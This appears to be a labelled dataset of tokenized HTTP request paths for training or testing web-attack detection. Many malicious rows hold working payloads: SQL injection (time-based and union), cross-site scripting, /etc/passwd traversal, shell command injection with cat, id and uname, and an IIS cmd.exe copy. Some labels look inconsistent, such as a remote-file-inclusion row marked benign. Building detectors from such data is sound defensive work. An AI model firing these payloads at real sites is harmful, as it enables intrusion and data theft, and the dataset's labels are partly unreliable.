request	label
/ string / strings / parameters = 0592934033194730 	0
/ l2zvcnvtl3jlbwfyayw0nda3ody0fnjvb3q9c2vjdxjpdhksmx5tb2rlpwzsyxq =  / 	0
/ 000024454 / 	0
"/ help . php ? q =  ""  & ver \ x09 > q66498964 & rem \ x09 "	1
/ string / strings / parameters = '  &  & echo xocejg $  (  ( 66 + 21 )  )  $  ( echo xocejg ) xocejg ' 	1
/ string / strings / parameters = barby 	0
/ string / strings / parameters = 51620770f 	0
/ 1163871341581 / 	0
/ javascript / aspx . 7z 	0
/ javascript / management . asmx 	0
/ string / modo = entrar & login = temp & pwd = tel7tipo ?  & remember = off & b1 = entrar 	1
/ en-us / account / c32web . exe / getimage ? imagename = cart32 . ini \ x00 . gif 	1
/ string / modo =  '  + delete + from + users & precio = 806 & b1 = confirmar 	1
/ 1612248 / 	0
/ gallery / search . php ? searchstring =  < script > alert ( document . cookie )  <  / script > 	1
/ wb-headline / 	0
/ javascript / hardware / 	0
/ 119758 / 	0
/ f220901b / 	0
/ 4325890 / 	0
/ string / id = 1 /  & nombre = jamn + ibrico & precio = 100 & cantidad = 73 & b1 = aadir + al + carrito 	1
/ v14971307 / 	0
/ wilderswinterlogo2006 / 	0
/ 000126157 / 	0
/ mzg2ntk5 / 	0
/ string / strings / parameters = 26291 	0
/ d7ktpmcq . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = -8760 )  where 8277 = 8277 union all select 8277 -- 	1
/ string / strings / parameters = praza pascasio fernandez seguin ,  7 	0
/ forum_arc . asp ? n =  `  / etc / passwd `  | 36 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  `  &  # 039 ;  . 	1
/ string / strings / parameters = kootenay . ramos @ mayoriasilenciosa . bi 	0
/ javascript / del . tar . bz2 	0
/ javascript / cert . xls 	0
/ 200775 / 	0
/ notescfp03 / 	0
"/ string / strings / parameters = ""  )  or sleep ( __time__ )  =  "" "	1
/ ultrafast_light / 	0
"/ top . php ? stuff =  ""  & uname  > q38114689  # "	1
/ pic_inouye / 	0
/ string / strings / parameters = 17923027r 	0
/ classes / dev_o . php ? absolutepath = xxpathxx 	1
/ 160079 / 	0
/ examples / jsp / num / news . php ? prevnext = 1 ' phpnews_prevnext_sql_injection . nasl 	1
/ string / strings / parameters = 0131573485313160 	0
/ string / strings / parameters = petrie3 @ menorca . com . kp 	0
/ manual / de / mod / mod_mem_cache . html 	0
/ cacti / index . php ? chemin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc 	1
/ cspan2_wm / 	0
/ string / strings / parameters = < script > alert (  ' xss '  )  ;  <  / script > 	1
"/ string / strings / parameters = ""  & echo $ ifsizikxp $  (  ( 4 + 56 )  )  $  ( echo $ ifsizikxp ) izikxp \  \ "	1
/ 874559 / 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 100 & cantidad = 22 & b1 = aadir + al + carrito 	0
"/ string / strings / parameters = 1 ""  ""  )  ; select case when 7717 = 7717 then 1 else null end -- "	1
/ melancolic / 	0
/ string / strings / parameters = amelio 	0
/ string / strings / parameters = milionario . kirkham @ programa-gestion-erp . mil 	0
/ toolbarhomecps / 	0
/ shoemoney / 	0
/ 0rufe52p . dll ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = tuneu 	0
/ examples / jsp / jsp2 / el / admin / top . php ? admindir =  / etc / passwd \ x00 	1
/ string / modo = entrar & login = dovel & pwd =  / buldar & remember = off & b1 = entrar 	1
/ javascript / tape . test 	0
/ string / strings / parameters = < iframe  src = j & newline ;  & tab ; a & newline ;  & tab ;  & tab ; v & newline ;  & tab ;  & tab ;  & tab ; a & newline ;  & tab ;  & tab ;  & tab ;  & tab ; s & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; c & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; r & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; i & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; p & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; t & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & colon ; a & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; l & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; e & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; r & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; t & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  (  & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ; 1 & newline ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  & tab ;  )  >  <  / iframe >   ? 	1
/ wb-dell / 	0
/ examples / jsp / error / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login 	1
/ cacti / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 5657119326927439 	0
/ scripts /  .  . 5c .  .  / winnt / system32 / cmd . exe ?  / x +  / c + copy  \ winnt \ system32 \ cmd . exe zbkhkr . exe 	1
/ string / id = 1 & nombre = jamn + ibrico & precio = 100 & cantidad = 5 & b1 = aadir + al + carrito 	0
"/ examples / jsp / checkbox / notify ? from = nessus ""  | id "" "	1
/ jenna haze- trained teens / 	0
/ hatena / 	0
/ bid construction project california / 	0
/ scripts / fileseek . cgi ? foot =  ; cat  / etc / passwd & head = 	1
/ string / modo = registro & login = correa & passworda = 5ortera & nombre = fructuosa & apellidos = polloni + homdedeu & email = berto @ sindualidad . dd & dni = 49742539w & direccion = c /  + einstein ,  + 147 ,  + 9 ? a & ciudad = legazpi & cp = 44349 & provincia = valencia & ntc = 2169388539628734 & b1 = registrar 	1
/ examples / jsp / jsp2 / jspx / upgrade / index . php ? steporder [  ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = \ 00 	1
/ ultimate-racing / 	0
/ 0672319853 / 	0
/ string / strings / parameters = 25324 	0
/ cgi-win / ion-p ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = & lt ; img src =  ` javascript &  # 058 ; alert (  \  "" rsnake says ,   ' xss '  \  ""  )  `  & gt ; "	1
/ highestrated_160 / 	0
/ static /  /  .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5cetc / passwd 	1
/ string / strings / parameters = 85855294c 	0
/ examples / jsp / jsp2 / el / apa_phpinclude . inc . php ? apa_module_basedir =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1581122247417335 	0
/ msgold_foot / 	0
/ ny1b3qq4 . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ unirival / 	0
/ 112982330760330225 / 	0
"/ string / strings / parameters = < iframe src =  "" data : image / svg-xml , "	1
/ rpcalc / 	0
/ vac1l5vm . cgi ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  (  ""  "" ksip ""  ""  like  ""  "" ksip "	1
"/ help . php ? q =  "" ping \ x0c-w \ x0c9000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c "	1
/ string / strings / parameters = luesia 	0
/ afroceads / 	0
/ brand_motorola / 	0
/ string / strings / parameters = 1 '  )  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  ' qfwc '  =  ' qfwc 	1
/ 043726 / 	0
/ javascript / phpbb . dump 	0
/ string / strings / parameters = ar52eti67 	0
/ string / strings / parameters = lesmeris 	0
/ brollydish / 	0
/ lsoix5h3 . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ psynch / nph-psa . exe ? css =  @ rfiurl 	1
/ string / strings / parameters = andoain 	0
/ string / strings / parameters = iznate 	0
/ string / strings / parameters = �? or 3 = 3  -- 	1
/ 044966 / 	0
/ cacti / admin / general . php ? mode = perlinfo & config [ general ]  [ perl_binary ]  = cat  / etc / passwd |  | 	1
"/ m4kkjf8l . fts ?  < meta http-equiv = set-cookie content =  "" testyglc = 8988 ""  > "	1
/ string / modo = registro & login = selva & password = cresta-da & nombre = filomena & apellidos = grigoriu + matons & email = delavanti @ brunoseguridad . by & dni = 28318850p & direccion = calle + san + isidro + labrador + 188 ,  + 13 ? h & ciudad = carceln & cp = 50692 & provincia = murcia & ntc = 6210304125395954 & b1 = registrar 	0
/ string / strings / parameters = v5482 + ct0 	0
/ supasite / admin_mods . php ? supa [ db_path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	0
/ examples / jsp / cal / main . cgi ? board = free_board & command = down_load & filename =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ amazon / info . php ? asin = xxpathxx 	1
/ main . php ? stuff =  ; uname  > q81835212  # 	1
/ javascript / foundation . exe 	1
/ q34259348 	0
/ en-us / h5sc3gxy . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = entrar & login = rolston & pwd = a ' 74u ' 4to & remember = off & b1 = entrar 	1
/ integrated_daily / 	0
/ javascript / phpbb . exe 	1
/ javascript / b2b . png 	0
/ taustakuva2_800x600 / 	0
/ string / strings / parameters = bond @ tomorrow . com . hk 	0
/ cgi-bin / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331904454 , 472430861  -- 	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 & cantidad = 49 & b1 = aadir + al + carrito '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
/ tc20061011_414464 / 	0
/ string / id = 2 /  & nombre = jamn + ibrico & precio = 100 & cantidad = 80 & b1 = aadir + al + carrito 	1
/ en-us / n9xlumt5 . aspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 1 '  )  )  and sleep ( 5 )  and  (  (  ' krrr '  =  ' krrr 	1
/ string / strings / parameters = '  echo fxjfmz $  (  ( 67 + 82 )  )  $  ( echo fxjfmz ) fxjfmz | 	1
/ string / strings / parameters = perl 	0
/ examples / jsp / jsp2 / jspx / home / search . asp ? nchannel =  ' 1 	1
"/ main . php ? stuff =  "" ver \ x0b > q67582951 & rem \ x0b "	1
/ javascript / tar . exe 	1
/ string / modo = registro & login = hamilton & password = 178gatorio & nombre =  '  + delete + from + users & apellidos = maquieira + san + segundo & email = glaessner-alwood @ softwaremasservicio . ic & dni = 29189199z & direccion = redonda ,  + 142 ,  + 13-g & ciudad = rbade & cp = 08673 & provincia = len & ntc = 7739977532136253 & b1 = registrar 	1
/ zqqemp6j . idc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = '  ;  str =  $  ( echo wsgiyr )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ string / strings / parameters = albercoque 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo iyhuso )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ recommended books / 	0
"/ top . php ? stuff =  "" ping \ x09-w \ x099000 \ x09-n \ x091 \ x094 . 3 . 2 . 1 | rem \ x09 "	1
/ string / strings / parameters = chatri1 	0
/ string / strings / parameters = impenetr-abilidad 	0
/ d01915 / 	0
/ v14986745 / 	0
/ wpnxxvon0300000424von / 	0
"/ examples / jsp / jsp2 / elsearch_results . dot ? search_query = nessus ""  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  / "	1
/ en-us / account / index . php ? act = arcade & do = stats & gameid = 1 ' 	1
/ 157303 / 	0
/ spamst2 / 	0
"/ xfkun1ku . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 501279 / 	0
/ modules / addons / plugin . php ? doc_root = xxpathxx 	1
/ projectbureau / 	0
/ scripts / atomicboard / index . php ? location =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 8779357519103789 	0
/ javascript / system . fcgi 	0
"/ ny1b3qq4 . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript /  . htaccess /  '  ` false `  ' 	1
/ h21y8w52 . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = carrer de merida 35 8-c 	0
/ rdxdrpm3yy77o / 	0
"/ string / strings / parameters = ""  |   [  1 -ne  $  ( echo daztlg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | "	1
/ string / strings / parameters = ;  str =  $  ( echo okknhf )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ mortar_gifts / 	0
/ scripts / cal_cat . php ? op = cats & year = 2008 & catview = 1 + union + select + 1 , 1332010411 	1
/ examples / jsp / num / search =  < script > alert (  ' xss '  )  <  / script > 	1
"/ iajtej82 . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ viewers / txt . php ? filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini \ x00 	1
/ teamlinuxfr-s / 	0
/ string / modo = registro & login = yu-hung & password = 4a8ar3nas & nombre = jugen & apellidos = blasco + rossetti & email = rodionova @ movil-google . ga & dni = 98058748l & direccion = almirante + cruilles + 19 ,  + 11 ? c & ciudad = tribaldos & cp = 09341 & provincia = lleida & ntc = 9639622169891672 & b1 = registrar 	0
/ cgi-bin / test-cgi . tcl 	0
/ examples / servlets / servlet / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = thalasso . chappell @ titulosoficiales . jp 	0
/ 106121213 / 	0
/ alcazar / 	0
/ javascript / voip . so 	0
/ string / strings / parameters = 1 '   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  ' nwdk '  like  ' nwdk 	1
/ string / strings / parameters = re53nc19g93s8 	0
/ 3gpconvert_information / 	0
"/ edition ""  / "	1
/ webcgi / ppdscgi . exe 	1
/ phenomena / 	0
/ en-us / account / supporter / tupdate . php ? groupid = change & sg =  ' 	1
/ admin / geo_zones . php ? zone =  < script > alert ( 414326083575 )  <  / script > 	1
/ javascript / preserve . exe 	1
/ string / strings / parameters = '  |  | echo axsulh $  (  ( 48 + 60 )  )  $  ( echo axsulh ) axsulh ' 	1
/ goscino / 	0
/ string / strings / parameters = despamplonar 	0
"/ u95h6ymu . html ?  < meta http-equiv = set-cookie content =  "" testkhwc = 4028 ""  > "	1
/ accountinfo / 	0
/ automateit ! _information / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  (  ""  "" ffcf ""  ""  like  ""  "" ffcf "	1
/ 105936 / 	0
/ string / strings / parameters = space3 	0
/ string / strings / parameters = 49317901j 	0
/ scripts / editor / filemanager / connectors / php / upload . php ? command = fileupload & type = file & currentfolder =  / fckeditor_currentfolder_file_upload-1331908744 . php . 	1
/ 231119 / 	0
/ string / strings / parameters = 1 '  )  )  and 2832 = 4165 -- 	1
/ string / modo = entrar & login = any ?  set-cookie :  + tamper = 5765205567234876235 & pwd = e4pe5imenta2a & remember = on & b1 = entrar 	1
"/ en-us / oie504mr . x ?  < meta http-equiv = set-cookie content =  "" testtpby = 7052 ""  > "	1
/ examples / jsp / sessions / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f 	1
/ scripts / nph-exploitscanget . cgi ? host =  ` id `  & port = 3128 & errchk = 0 & idsbypass = 0 	1
"/ xsqln7eb . do ?  < meta http-equiv = set-cookie content =  "" testpcbb = 9254 ""  > "	1
"/ 33y9gcqq . exe ?  < script > document . cookie =  "" testnvxc = 4301 ;  ""  <  / script > "	1
/ string / strings / parameters = -6600 '  )  union all select 5566 , 5566 # 	1
/ javascript / 403 . zip 	0
"/ string / strings / parameters = 1 ""  ""  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ""  "" ncym ""  ""  like  ""  "" ncym "	1
/ string / strings / parameters = 1 '  )  )  and elt ( 4460 = 2665 , 2665 )  and  (  (  ' qmzu '  =  ' qmzu 	1
/ javascript / cgi-pub . 7z 	0
"/ string / strings / parameters = < a style =  "" -o-link :  ' javascript : alert ( 1 )  '  ; -o-link-source : current ""  > x <  / a > "	1
/ string / str =  $  ( echo yqabcf )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ javascript / en_us 	0
/ ewidoantimalware / 	0
"/ string / strings / parameters = < img src onerror  /  ""   '  ""  =  alt = javascript : alert ( 1 )  /  /  ""  > "	1
/ list_20020728134435 / 	0
/ newsclips / 	0
/ 20030604-1 / 	0
/ 127935 / 	0
/ javascript / accounting . exe 	1
/ administrator / menu_add . php ? site_absolute_path = xxpathxx ? 	1
/ mod_alias / 	0
/ string / modo = registro & login = boeck & password = atelaje & nombre = ina & apellidos = de + agreda + bellmunt & email = quester @ expozaragozafloral2014 . gq & dni = 87110948n & direccion = calle + atletico + de + madrid ,  + 62 + 6-c & ciudad = valdesamario & cp = 21891 & provinciaa = segovia & ntc = 0738940592435694 & b1 = registrar 	1
"/  \ x0a \ x0a < script > alert (  \  "" vulnerable \  ""  )  <  / script >  . jsp "	1
"/ top . php ? stuff =  "" uname  # "	1
/ social software / 	0
/ javascript / citrix . class 	0
/ string / strings / parameters = 1 '  )  )  ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual -- 	1
/ javascript / cgm-web . inc 	0
/ string / strings / parameters = jado 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 57 & b1 = aadir + al + carrito 	0
/ string / modo = registro & login = free & password = ba3ce79 & nombre = delmo & apellidos = guinaldo + guals & email = ordezanka @ arroyo-molinos . dj & dni = 65340567m & direccion = av .  + doa + urraca ,  + 31 ,  +  & ciudad = sant + pere + pescador & cp = 49515 & provincia = teruel & ntc = 1755430975595986 & b1 = registrar 	0
